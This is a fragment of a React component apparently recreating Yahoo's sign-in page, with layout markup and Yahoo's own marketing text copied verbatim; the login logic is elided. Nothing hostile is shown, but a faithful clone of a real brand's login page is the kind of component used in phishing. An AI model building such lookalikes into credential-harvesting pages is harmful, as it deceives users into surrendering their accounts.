...
const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
  ...
  return (
    <div className="min-h-screen bg-white font-sans flex flex-col">
      ...
      {/* Corrected layout for vertical alignment */}
      <main className="flex-grow flex justify-center w-full px-4 pt-16 sm:pt-20">
        <div className="flex w-full max-w-6xl items-start">
          {/* Left side text */}
          <div className="hidden md:flex flex-col w-1/2 pt-12 pr-16">
            <h1 className="text-3xl font-bold text-gray-800 mb-4 tracking-tight">Yahoo makes it easy to enjoy what matters most in your world.</h1>
            <p className="text-lg text-gray-600 leading-relaxed">Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>
          </div>
